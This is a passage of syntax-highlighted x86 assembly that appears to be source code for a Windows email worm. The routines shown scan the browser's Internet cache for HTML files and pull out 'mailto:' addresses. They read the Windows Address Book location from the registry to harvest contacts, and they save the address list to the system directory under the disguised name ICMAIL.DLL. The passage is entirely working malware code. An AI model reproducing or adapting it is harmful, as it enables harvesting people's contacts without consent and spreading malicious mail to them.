      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
            
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">                 </span><span class="sc1">; System Dir</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'\ICMAIL.DLL'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrcat</span><span class="sc0">                             </span><span class="sc1">; Path+Name of File to Create                          </span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> 
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CreateFileA</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">EmailFileError</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">TempFileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ByteWritten</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">EmailFileSize</span><span class="sc0">                   </span><span class="sc1">; Copy Listes d'Emails</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EmailList</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">TempFileHandle</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">WriteFile</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TempFileHandle</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc0">        
        
</span><span class="sc5">EmailFileError</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;........................ Find Email in HTML .................................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">

</span><span class="sc1">; Recursive Search from Internet Path for Email in Html</span><span class="sc0">

</span><span class="sc5">SearchHtmFile_Email</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">     
        
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">20h</span><span class="sc0">                     </span><span class="sc1">; Internet Path      </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">SHGetSpecialFolderPathA</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">            </span><span class="sc1">; Selected dir = Internet Path</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SeekHtmlCurrentDir</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">RoutineToCall</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">AllSubDirSearch</span><span class="sc0">             </span><span class="sc1">; Action = SeekHtmlCurrentDir</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">   

</span><span class="sc1">;.............. Seek Html in Current Dir</span><span class="sc0">

</span><span class="sc1">; IN:           Selected Current dir</span><span class="sc0">
</span><span class="sc1">; OUT:          Emails in reserved Mem</span><span class="sc0">
        
</span><span class="sc5">SeekHtmlCurrentDir</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">  </span><span class="sc1">; ENOUGH EMAILS FOUND !</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">HtmlEmailSearchEnd</span><span class="sc0">                      </span><span class="sc1">; YES...</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc12">'*.*htm*'</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">FindFirstFileA</span><span class="sc0">      
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">SeekEmail_Html</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SeekEmail_Html</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">SeekEmail_Html_Loop</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SeekEmail_In_ThisHtml</span><span class="sc0">               </span><span class="sc1">; Parse Html 4 emails</span><span class="sc0">
        
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">  </span><span class="sc1">; ENOUGH EMAILS FOUND !</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">HtmlEmailSearchFin</span><span class="sc0">                      </span><span class="sc1">; YES...</span><span class="sc0">
                        
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">             
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">FindNextFileA</span><span class="sc0">               
    </span><span class="sc6">dec</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">          </span><span class="sc5">SeekEmail_Html_Loop</span><span class="sc0">

</span><span class="sc5">HtmlEmailSearchFin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">FindClose</span><span class="sc0">               
</span><span class="sc5">HtmlEmailSearchEnd</span><span class="sc4">:</span><span class="sc0"> 
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;.............. Parse Html for emails</span><span class="sc0">

</span><span class="sc5">SeekEmail_In_ThisHtml</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">GENERIC_READ</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">search.FileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">CreateFileA</span><span class="sc0">             
    </span><span class="sc6">inc</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">HtmlEmailSearchEnd</span><span class="sc0">              </span><span class="sc1">; Only ret for the call</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; Not the total end </span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">CreateFileMappingA</span><span class="sc0">          
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CloseHtmlHandle</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">MapViewOfFile</span><span class="sc0">               
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CloseHtml_MapHandle</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">maphandlemail</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">esi_save</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetFileSize</span><span class="sc0">             
    </span><span class="sc6">xchg</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">       </span><span class="sc5">CloseHtml_MapViewHandle</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">CloseHtml_MapViewHandle</span><span class="sc0">             </span><span class="sc1">; GetFileSize Error ?</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">FixBugOverflow</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jl</span><span class="sc0">        </span><span class="sc5">CloseHtml_MapViewHandle</span><span class="sc0">

</span><span class="sc5">SeekMailToStr</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">esi_save</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">MTStr</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'mailto:'</span><span class="sc0">
</span><span class="sc5">MTStr</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">ScanFor_MailTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">                       </span><span class="sc1">; search for "mailto:"</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                               </span><span class="sc1">; string</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">MailToFound_CheckEmail</span><span class="sc0">            </span><span class="sc1">; check the mail address</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">         </span><span class="sc5">ScanFor_MailTo</span><span class="sc0">      

</span><span class="sc5">CloseHtml_MapViewHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc5">maphandlemail</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">     
</span><span class="sc5">CloseHtml_MapHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">             
</span><span class="sc5">CloseHtmlHandle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">CloseHandle</span><span class="sc0">             
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MailToFound_CheckEmail</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">esi_save</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EmailList</span><span class="sc4">]</span><span class="sc0">             
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">rol</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                              </span><span class="sc1">; 64 = email size stockage</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">; goto next place</span><span class="sc0">
        
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">EmailCurrentPos</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; mail address</span><span class="sc0">

</span><span class="sc5">NextChar</span><span class="sc4">:</span><span class="sc0">   
      </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">SkipChar</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">                         </span><span class="sc1">; eMail End ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndChar</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'?'</span><span class="sc0">                         </span><span class="sc1">; eMail End ?</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">EndChar</span><span class="sc0">    
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'&gt;'</span><span class="sc0">                         </span><span class="sc1">; eMail End ?</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">EndChar</span><span class="sc0">      
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'&lt;'</span><span class="sc0">                         </span><span class="sc1">; eMail End ?</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">EndChar</span><span class="sc0">      
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">']'</span><span class="sc0">                         </span><span class="sc1">; eMail End ?</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">EndChar</span><span class="sc0">              
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">''''</span><span class="sc0">                        </span><span class="sc1">; eMail End ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndChar</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'@'</span><span class="sc0">                         </span><span class="sc1">; Valid email ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CopyChar</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">CopyChar</span><span class="sc4">:</span><span class="sc0">     
      </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NextChar</span><span class="sc0">
</span><span class="sc5">SkipChar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NextChar</span><span class="sc0">
</span><span class="sc5">EndChar</span><span class="sc4">:</span><span class="sc0">    
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; if EDX=0, mail is not</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">SeekMailToStr</span><span class="sc0">               </span><span class="sc1">; valid (no '@')</span><span class="sc0">
      
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">NoEmailYet</span><span class="sc0">
       
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EmailCurrentPos</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">SeekMailToStr</span><span class="sc0">
        
</span><span class="sc5">NoEmailYet</span><span class="sc4">:</span><span class="sc0">     
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">]</span><span class="sc0">       
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">NbEmailWanted</span><span class="sc0">  </span><span class="sc1">; ENOUGH EMAILS FOUND !</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">CloseHtml_MapViewHandle</span><span class="sc0">                 </span><span class="sc1">; YES...        </span><span class="sc0">
        
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SeekMailToStr</span><span class="sc0">                   </span><span class="sc1">; get next email address</span><span class="sc0">


</span><span class="sc1">;........................ Find Email in WAB ..................................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">

</span><span class="sc5">SearchWabFile_Email</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">

</span><span class="sc5">GetWabPath</span><span class="sc4">:</span><span class="sc0">       
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">KeySize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">             </span><span class="sc1">; Init Size to get</span><span class="sc0">
        
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeySize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Reg</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">  
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"Software\Microsoft\Wab\WAB4\Wab File Name"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">80000001h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">     </span><span class="sc5">SHGetValueA</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">EndWab</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">Map_WabFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">EndWab</span><span class="sc0">
        
</span><span class="sc5">WabSearchEmail</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; Nb of address</span><span class="sc0">
      </span><span class="sc6">jecxz</span><span class="sc0">     </span><span class="sc5">WabUnmapView</span><span class="sc0">                        </span><span class="sc1">; No address</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; For the Html search</span><span class="sc0">
